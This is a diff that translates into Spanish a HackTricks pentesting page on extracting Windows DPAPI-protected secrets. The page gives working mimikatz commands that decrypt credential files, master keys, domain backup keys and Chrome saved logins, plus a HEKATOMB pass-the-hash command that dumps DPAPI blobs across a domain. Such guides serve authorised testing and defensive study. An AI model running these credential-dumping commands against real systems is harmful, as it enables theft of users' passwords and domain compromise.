@@ -1,55 +1,54 @@
-# DPAPI - Extracting Passwords
+# DPAPI - Extrayendo Contraseñas
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.
+​​[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad más relevante en **España** y uno de los más importantes en **Europa**. Con **la misión de promover el conocimiento técnico**, este congreso es un punto de encuentro hirviente para los profesionales de la tecnología y la ciberseguridad en todas las disciplinas.
 
 {% embed url="https://www.rootedcon.com/" %}
 
-While creating this post mimikatz was having problems with every action that interacted with DPAPI therefore **most of the examples and images were taken from**: [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)
+Al crear esta publicación, mimikatz tenía problemas con cada acción que interactuaba con DPAPI, por lo tanto, **la mayoría de los ejemplos e imágenes fueron tomados de**: [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)
 
-## What is DPAPI
+## ¿Qué es DPAPI?
 
-Its primary use in the Windows operating system is to **perform symmetric encryption of asymmetric private keys**, using a user or system secret as a significant contribution of entropy.\
-**DPAPI allows developers to encrypt keys using a symmetric key derived from the user's logon secrets**, or in the case of system encryption, using the system's domain authentication secrets.
+Su uso principal en el sistema operativo Windows es **realizar cifrado simétrico de claves privadas asimétricas**, utilizando un secreto de usuario o sistema como una contribución significativa de entropía.\
+**DPAPI permite a los desarrolladores cifrar claves utilizando una clave simétrica derivada de los secretos de inicio de sesión del usuario**, o en el caso del cifrado del sistema, utilizando los secretos de autenticación de dominio del sistema.
 
-This makes very easy to developer to **save encrypted data** in the computer **without** needing to **worry** how to **protect** the **encryption** **key**.
+Esto hace que sea muy fácil para el desarrollador **guardar datos cifrados** en la computadora **sin** necesidad de **preocuparse** por cómo **proteger** la **clave de cifrado**.
 
-### What does DPAPI protect?
+### ¿Qué protege DPAPI?
 
-DPAPI is utilized to protect the following personal data:
+DPAPI se utiliza para proteger los siguientes datos personales:
 
-* Passwords and form auto-completion data in Internet Explorer, Google \*Chrome
-* E-mail account passwords in Outlook, Windows Mail, Windows Mail, etc.
-* Internal FTP manager account passwords
-* Shared folders and resources access passwords
-* Wireless network account keys and passwords
-* Encryption key in Windows CardSpace and Windows Vault
-* Remote desktop connection passwords, .NET Passport
-* Private keys for Encrypting File System (EFS), encrypting mail S-MIME, other user's certificates, SSL/TLS in Internet Information Services
-* EAP/TLS and 802.1x (VPN and WiFi authentication)
-* Network passwords in Credential Manager
-* Personal data in any application programmatically protected with the API function CryptProtectData. For example, in Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk etc.
+* Contraseñas y datos de autocompletado de formularios en Internet Explorer, Google \*Chrome
+* Contraseñas de cuentas de correo electrónico en Outlook, Windows Mail, Windows Mail, etc.
+* Contraseñas de cuentas de administrador de FTP interno
+* Contraseñas de acceso a carpetas y recursos compartidos
+* Claves y contraseñas de cuentas de red inalámbrica
+* Clave de cifrado en Windows CardSpace y Windows Vault
+* Contraseñas de conexión de escritorio remoto, .NET Passport
+* Claves privadas para el sistema de archivos cifrado (EFS), cifrado de correo S-MIME, certificados de otros usuarios, SSL/TLS en Internet Information Services
+* EAP/TLS y 802.1x (autenticación VPN y WiFi)
+* Contraseñas de red en el Administrador de credenciales
+* Datos personales en cualquier aplicación protegida programáticamente con la función de API CryptProtectData. Por ejemplo, en Skype, Windows Rights Management Services, Windows Media, MSN Messenger, Google Talk, etc.
 * ...
 
 {% hint style="info" %}
-An example of a successful and clever way to protect data using DPAPI is the implementation of the auto-completion password encryption algorithm in Internet Explorer. To encrypt the login and password for a certain web page, it calls the CryptProtectData function, where in the optional entropy parameter it specifies the address of the web page. Thus, unless one knows the original URL where the password was entered, nobody, not even Internet Explorer itself, can decrypt that data back.
+Un ejemplo de una forma exitosa e inteligente de proteger datos utilizando DPAPI es la implementación del algoritmo de cifrado de contraseñas de autocompletado en Internet Explorer. Para cifrar el inicio de sesión y la contraseña para una determinada página web, llama a la función CryptProtectData, donde en el parámetro de entropía opcional especifica la dirección de la página web. Por lo tanto, a menos que se conozca la URL original donde se ingresó la contraseña, nadie, ni siquiera Internet Explorer, puede descifrar esos datos.
 {% endhint %}
 
-## List Vault
-
+## Listar Vault
 ```bash
 # From cmd
 vaultcmd /listcreds:"Windows Credentials" /all
@@ -57,20 +56,16 @@ vaultcmd /listcreds:"Windows Credentials" /all
 # From mimikatz
 mimikatz vault::list
 ```
+## Archivos de Credenciales
 
-## Credential Files
-
-The **credentials files protected by the master password** could be located in:
-
+Los **archivos de credenciales protegidos por la contraseña maestra** podrían estar ubicados en:
 ```
 dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-
-Get credentials info using mimikatz `dpapi::cred`, in the response you can find interesting info such as the encrypted data and he guidMasterKey.
-
+Obtén información de credenciales usando mimikatz `dpapi::cred`, en la respuesta puedes encontrar información interesante como los datos encriptados y el guidMasterKey.
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
 
@@ -80,17 +75,13 @@ guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
 pbData             : b8f619[...snip...]b493fe
 [..]
 ```
-
-You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt:
-
+Puedes utilizar el módulo **mimikatz** `dpapi::cred` con el `/masterkey` apropiado para descifrar:
 ```
 dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
 ```
+## Claves maestras
 
-## Master Keys
-
-The DPAPI keys used for encrypting the user's RSA keys are stored under `%APPDATA%\Microsoft\Protect\{SID}` directory, where {SID} is the [**Security Identifier**](https://en.wikipedia.org/wiki/Security\_Identifier) **of that user**. **The DPAPI key is stored in the same file as the master key that protects the users private keys**. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it using`dir` from the cmd, but you can list it from PS).
-
+Las claves DPAPI utilizadas para cifrar las claves RSA del usuario se almacenan en el directorio `%APPDATA%\Microsoft\Protect\{SID}`, donde {SID} es el [**Identificador de seguridad**](https://en.wikipedia.org/wiki/Security\_Identifier) **de ese usuario**. **La clave DPAPI se almacena en el mismo archivo que la clave maestra que protege las claves privadas del usuario**. Por lo general, consta de 64 bytes de datos aleatorios. (Tenga en cuenta que este directorio está protegido, por lo que no se puede listar usando `dir` desde el cmd, pero se puede listar desde PS).
 ```bash
 Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
@@ -99,23 +90,19 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-
-This is what a bunch of Master Keys of a user will looks like:
+Esto es lo que parecerá un conjunto de Claves Maestras de un usuario:
 
 ![](<../../.gitbook/assets/image (324).png>)
 
-Usually **each master keys is an encrypted symmetric key that can decrypt other content**. Therefore, **extracting** the **encrypted Master Key** is interesting in order to **decrypt** later that **other content** encrypted with it.
+Por lo general, **cada clave maestra es una clave simétrica cifrada que puede descifrar otro contenido**. Por lo tanto, **extraer** la **Clave Maestra cifrada** es interesante para poder **descifrar** más tarde ese **otro contenido** cifrado con ella.
 
-### Extract master key & decrypt
+### Extraer y descifrar la clave maestra
 
-In the previous section we found the guidMasterKey which looked like `3e90dd9e-f901-40a1-b691-84d7f647b8fe`, this file will be inside:
-
+En la sección anterior encontramos el guidMasterKey que parecía ser `3e90dd9e-f901-40a1-b691-84d7f647b8fe`, este archivo estará dentro de:
 ```
 C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>
 ```
-
-For where you can extract the master key with mimikatz:
-
+Para dónde puedes extraer la clave maestra con mimikatz:
 ```bash
 # If you know the users password
 dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected
@@ -123,80 +110,63 @@ dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-
 # If you don't have the users password and inside an AD
 dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /rpc
 ```
+El archivo mostrará la clave maestra en la salida.
 
-The master key of the file will appear in the output.
-
-Finally, you can use that **masterkey** to **decrypt** the **credential file**:
-
+Finalmente, puedes usar esa **clave maestra** para **descifrar** el **archivo de credenciales**:
 ```
 mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
 ```
+### Extraer todas las claves maestras locales con permisos de administrador
 
-### Extract all local Master Keys with Administrator
-
-If you are administrator you can obtain the dpapi master keys using:
-
+Si eres administrador, puedes obtener las claves maestras de dpapi usando:
 ```
 sekurlsa::dpapi
 ```
+### Extraer todas las claves maestras de backup con Domain Admin
 
-![](<../../.gitbook/assets/image (326).png>)
-
-### Extract all backup Master Keys with Domain Admin
-
-A domain admin may obtain the backup dpapi master keys that can be used to decrypt the encrypted keys:
-
+Un administrador de dominio puede obtener las claves maestras de backup de dpapi que se pueden utilizar para descifrar las claves cifradas:
 ```
 lsadump::backupkeys /system:dc01.offense.local /export
 ```
-
-![](<../../.gitbook/assets/image (327).png>)
-
-Using the retrieved backup key, let's decrypt user's `spotless` master key:
-
+Usando la clave de respaldo recuperada, vamos a descifrar la clave maestra del usuario `spotless`:
 ```bash
 dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
 ```
-
-We can now decrypt user's `spotless` chrome secrets using their decrypted master key:
-
+Ahora podemos descifrar los secretos de Chrome del usuario `spotless` utilizando su clave maestra descifrada:
 ```
 dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
 ```
+## Cifrado y descifrado de contenido
 
-![](<../../.gitbook/assets/image (329).png>)
-
-## Encrypting and Decrypting content
-
-You can find an example of how to encrypt and decrypt data with DAPI using mimikatz and C++ in [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)\
-You can find an example on how to encrypt and decrypt data with DPAPI using C# in [https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)
+Puede encontrar un ejemplo de cómo cifrar y descifrar datos con DPAPI usando Mimikatz y C++ en [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)\
+Puede encontrar un ejemplo de cómo cifrar y descifrar datos con DPAPI usando C# en [https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)
 
 ## SharpDPAPI
 
-[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) is a C# port of some DPAPI functionality from [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) project.
+[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) es una versión en C# de algunas funcionalidades de DPAPI del proyecto Mimikatz de [@gentilkiwi](https://twitter.com/gentilkiwi).
 
 ## HEKATOMB
 
-[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is a tool that automates the extraction of all users and computers from the LDAP directory and the extraction of domain controller backup key through RPC. The script will then resolve all computers ip address and perform a smbclient on all computers to retrieve all DPAPI blobs of all users and decrypt everything with domain backup key.
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) es una herramienta que automatiza la extracción de todos los usuarios y equipos del directorio LDAP y la extracción de la clave de copia de seguridad del controlador de dominio a través de RPC. El script resolverá todas las direcciones IP de los equipos y realizará un smbclient en todos los equipos para recuperar todos los blobs de DPAPI de todos los usuarios y descifrar todo con la clave de copia de seguridad del dominio.
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-With extracted from LDAP computers list you can find every sub network even if you didn't know them !
+¡Con la lista de equipos extraída de LDAP, puede encontrar todas las subredes incluso si no las conocía!
 
-"Because Domain Admin rights are not enough. Hack them all."
+"Porque los derechos de administrador de dominio no son suficientes. Hackéalos a todos".
 
 ## DonPAPI
 
-[**DonPAPI**](https://github.com/login-securite/DonPAPI) can dump secrets protected by DPAPI automatically.
+[**DonPAPI**](https://github.com/login-securite/DonPAPI) puede volcar secretos protegidos por DPAPI automáticamente.
 
-## References
+## Referencias
 
 * [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
 * [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.
+[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad más relevante en **España** y uno de los más importantes en **Europa**. Con **la misión de promover el conocimiento técnico**, este congreso es un punto de encuentro candente para los profesionales de la tecnología y la ciberseguridad en todas las disciplinas.
 
 {% embed url="https://www.rootedcon.com/" %}
 
@@ -204,10 +174,10 @@ With extracted from LDAP computers list you can find every sub network even if y
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* ¿Trabaja en una empresa de **ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
+* Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Comparta sus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
